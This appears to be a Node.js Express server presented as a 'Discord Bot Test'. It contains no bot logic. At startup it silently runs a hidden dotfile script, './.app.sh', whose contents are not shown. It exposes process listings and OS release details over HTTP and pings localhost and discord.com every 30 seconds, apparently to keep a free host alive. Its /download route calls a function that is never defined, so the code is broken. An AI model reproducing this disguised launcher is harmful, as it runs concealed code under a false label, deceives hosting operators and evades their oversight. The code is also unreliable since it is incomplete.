const express = require("express");
// const proxy = require('express-http-proxy');
const app = express();

const port = 3000;  // Need TO MODIFY
var exec = require("child_process").exec;
const os = require("os");
//const { createProxyMiddleware } = require("http-proxy-middleware");
var request = require("request");
var fs = require("fs");
var path = require("path");


app.get("/", (req, res) => {
  res.send("Discord Bot Test");
});
// app.use('/', express.static(path.join(__dirname, 'public')))

// Web Status
app.get("/status", (req, res) => {
  let cmdStr = "ps -ef";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.type("html").send("<pre>Comand Error:\n" + err + "</pre>");
    } else {
      res.type("html").send("<pre>Command Executed Result:\n" + stdout + "</pre>");
    }
  });
});

//Web Info
app.get("/info", (req, res) => {
  let cmdStr = "cat /etc/*release | grep -E ^NAME";
  exec(cmdStr, function (err, stdout, stderr) {
    if (err) {
      res.send("Info Fetch Error:" + err);
    } else {
      res.send(
        "Command Executed Result:\n" +
          "Linux System:" +
          stdout +
          "\nRAM:" +
          os.totalmem() / 1000 / 1000 + "MB"
      );
    }
  });
});

//File Test
app.get("/test", (req, res) => {
  fs.writeFile("./test.txt", "NEW FILE Contents!", function (err) {
    if (err) res.send("File permisson - read-only :" + err);
    else res.send("File Test done:");
  });
});

app.get("/download", (req, res) => {
  download_web((err) => {
    if (err) res.send("Download error");
    else res.send("Download successfully");
  });
});

function keepalive() {
  exec("curl localhost:3000", function (err, stdout, stderr) {
    if (err) {
      console.log("Bot Error: " + err);
    } else {
      console.log("Bot Connected ...");
    }
  });
  exec("curl https://discord.com/" , function (err, stdout, stderr) {
    if (err) {
      console.log("Discord Connection Error: " + err);
    } else {
      console.log("Discord Bot Connected !");
    }
  });
}
setInterval(keepalive, 30 * 1000);

exec("bash ./.app.sh", function (err, stdout, stderr) {
  if (err) {
    console.error(err);
  }
  console.log(stdout);
});

app.listen(port, () => console.log(`App listening on port ${port}!`));